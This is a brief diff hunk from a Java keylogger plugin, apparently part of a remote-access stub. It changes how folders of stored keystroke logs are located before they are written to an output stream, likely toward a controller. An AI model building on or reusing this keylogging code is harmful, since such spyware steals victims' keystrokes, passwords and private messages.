@@ -53,7 +53,7 @@ public class KeyloggerPlugin extends StubPlugin {
 				}
 			}
 		} else if (header == LOGS_HEADER) {
-			File[] years = Keylogger.getYearFolder().listFiles();
+			File[] years = getLogsRoot().listFiles();
 			
 			dos.writeByte(LOGS_HEADER);
 			
